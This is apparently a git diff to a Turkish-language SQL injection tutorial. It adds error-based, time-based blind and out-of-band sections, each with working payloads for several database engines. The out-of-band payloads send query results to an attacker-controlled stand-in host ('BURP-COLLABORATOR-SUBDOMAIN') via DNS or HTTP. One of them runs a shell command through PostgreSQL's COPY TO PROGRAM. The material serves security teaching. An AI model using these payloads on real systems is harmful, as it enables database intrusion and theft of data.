@@ -132,6 +132,29 @@ In-Band SQL Injection, saldırganın aynı kanal üzerinden hem zafiyeti sömür
 ## Error Based SQL Injection
 Error-Based SQL Injection, veritabanının hata mesajlarını doğrudan kullanıcıya döndürmesi sayesinde veritabanı yapısı, tablolar, sütunlar gibi hassas bilgilerin çıkarılmasına olanak sağlar. Hata mesajları saldırgana bilgi sızıntısı yapar ve genellikle yapı keşfi için kullanılır.
 
+Örnek Payload’lar ile Veri Sızdırma
+Microsoft SQL Server:
+```sql
+SELECT 'foo' WHERE 1 = (SELECT 'secret');
+```
+
+Burada 'secret' ifadesi hatanın bir parçası olarak döner.
+
+PostgreSQL:
+```sql
+SELECT CAST((SELECT password FROM users LIMIT 1) AS int);
+```
+
+CAST(... AS int) ile string değeri integer’a dönüştürmeye çalışmak hata verir ve string doğrudan hata mesajında görünür.
+
+MySQL:
+```sql
+SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')));
+```
+
+EXTRACTVALUE() fonksiyonuna geçersiz XML/XPath girdisi verilerek hata tetiklenir, içine gömülen veri hata mesajında görünür.
+
+
 # UNION Based SQL Injection
 Bu SQL Injection türü SQL UNION operatörünü bir SELECT ifadesi ile birleştirerek sayfaya ek sonuçlar döndürmek için kullanılır. Bu yöntem geniş miktarda veri çıkartmanın en yaygın yoludur.
 
@@ -203,7 +226,7 @@ http://example.com/blog?id=1 UNION SELECT null, table_name, null FROM informatio
 
 Bu, mevcut veritabanındaki tabloların isimlerinden 5 tanesini çeker.
 
-# Blind SQL Injection Boolean Based
+# Blind SQL Injection - Boolean Based
 Blind SQL Injection Boolean Based
 
 Boolean tabanlı SQL Injection, injection denemelerinden aldığımız yanıtın true/false gibi sadece iki olası sonucu olduğu durumlarda kullanılır. Bu sonuçlar, SQL Injection payload'ının başarılı olup olmadığını anlamamızı sağlar. Bu iki yanıttan yola çıkarak, karakter karakter veritabanı yapısını keşfetmek mümkündür.
@@ -305,3 +328,108 @@ WHERE username='admin'
 AND password LIKE 'a%';-- -
 ```
 Her karakter test edilerek, tam parola ortaya çıkar.
+
+Özet:
+Boolean tabanlı SQL Injection’da, her sorgunun sonucu yalnızca true veya false olur. Bu basit mantık ile sütun sayısından veritabanı adlarına, tablolardan kolonlara kadar tüm veritabanı yapısı ve içerik karakter karakter ortaya çıkarılabilir.
+
+# Blind SQL Injection – Time Based
+
+Time-based SQL Injection, Boolean-based SQL Injection’a oldukça benzer çalışır.
+Ancak burada sorgunun doğru veya yanlış olduğuna dair doğrudan bir yanıt (true/false) yoktur. Bunun yerine, sorgunun tamamlanma süresi üzerinden başarı tespiti yapılır.
+
+Eğer sorgu doğru koşulda çalışıyorsa, veritabanına kasıtlı olarak gecikme (delay) eklenir ve bu gecikme istemci tarafında ölçülür.
+Bu yöntem genellikle SLEEP() (MySQL), pg_sleep() (PostgreSQL) veya WAITFOR DELAY (MSSQL) fonksiyonları ile uygulanır.
+
+Örnek: Sütun Sayısını Bulma
+
+Boolean-based saldırıda olduğu gibi, önce doğru sütun sayısını bulmamız gerekir. Ancak burada doğrulama kriterimiz yanıt süresi olacaktır.
+Örneğin:
+```sql
+test' UNION SELECT SLEEP(5);-- -
+```
+
+- Eğer yanıt süresinde gecikme yoksa → sütun sayısı yanlış.
+- Eğer yanıt ~5 saniye gecikirse → sütun sayısı doğru.
+
+Daha fazla sütun ekleyerek doğru sayıya ulaşırız:
+```sql
+test' UNION SELECT SLEEP(5), NULL;-- -
+test' UNION SELECT SLEEP(5), NULL, NULL;-- -
+```
+
+True sonucu yerine gecikme bizim doğrulama kriterimizdir.
+Veritabanı Bilgilerini Keşfetme
+
+Time-based saldırılarda, Boolean-based payload’lar SLEEP() fonksiyonu ile birleştirilerek çalışır.
+
+Örneğin, veritabanı adının “a” ile başlayıp başlamadığını test etmek:
+```sql
+test' AND IF(database() LIKE 'a%', SLEEP(5), 0);-- -
+```
+- Eğer ad “a” ile başlıyorsa → yanıt 5 saniye gecikir.
+- Değilse → yanıt normal hızda döner.
+
+Aynı mantıkla tablolar, kolonlar ve veriler karakter karakter elde edilebilir:
+
+```sql
+test' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 1, 1)='u', SLEEP(5), 0);-- -
+```
+
+Özet:
+Time-based SQL Injection, doğrudan çıktı alınamayan durumlarda kullanılır. Yanıt süresi bir “true/false” göstergesi olarak değerlendirilir. Boolean-based tekniklerin tümü, burada zaman gecikmesi mantığı ile uygulanabilir.
+
+# OUT-of-BAND SQL Injection
+Out-of-Band SQL Injection, saldırı sonucunu aynı HTTP yanıtı üzerinden değil, harici bir ağ çağrısı üzerinden elde etme yöntemidir.
+Yani veri tek bir kanal üzerinden gönderilmez:
+- Saldırı kanalı: SQL Injection payload’ının gönderildiği normal HTTP isteği
+- Veri toplama kanalı: Saldırganın kontrol ettiği bir servis (HTTP/DNS gibi)
+
+Bu yöntem özellikle Blind SQL Injection senaryolarında, veri çıkartmanın klasik Boolean veya Time-based tekniklerle çok yavaş veya imkânsız olduğu durumlarda kullanılır.
+
+### Temel Çalışma Mantığı
+- SQL sorgusuna, veritabanının dış dünyaya bir HTTP veya DNS isteği yapmasını sağlayacak bir payload enjekte edilir.
+- Bu isteğin domaini saldırganın kontrolündeki bir sunucuya yönlendirilir (ör. BURP-COLLABORATOR-SUBDOMAIN).
+- Veri bu domain ismine gömülerek gönderilir.
+- Saldırgan, kendi sunucusuna gelen istekten veriyi okur.
+
+Örnek Payload’lar
+Oracle:
+```sql
+SELECT EXTRACTVALUE(
+  xmltype('<?xml version="1.0" encoding="UTF-8"?>
+           <!DOCTYPE root [ 
+             <!ENTITY % remote SYSTEM "http://' || (SELECT YOUR-QUERY-HERE) || '.BURP-COLLABORATOR-SUBDOMAIN/"> 
+             %remote;
+           ]>'),
+  '/l'
+) FROM dual;
+```
+
+Microsoft SQL Server:
+```sql
+DECLARE @p VARCHAR(1024);
+SET @p = (SELECT YOUR-QUERY-HERE);
+EXEC('master..xp_dirtree "//' + @p + '.BURP-COLLABORATOR-SUBDOMAIN/a"');
+```
+
+PostgreSQL:
+```sql
+CREATE OR REPLACE FUNCTION f() RETURNS void AS $$
+DECLARE 
+    c TEXT;
+    p TEXT;
+BEGIN
+    SELECT INTO p (SELECT YOUR-QUERY-HERE);
+    c := 'COPY (SELECT '''') TO PROGRAM ''nslookup ' || p || '.BURP-COLLABORATOR-SUBDOMAIN''';
+    EXECUTE c;
+END;
+$$ LANGUAGE plpgsql SECURITY DEFINER;
+
+SELECT f();
+```
+
+MySQL:
+```sql
+SELECT YOUR-QUERY-HERE 
+INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a';
+```
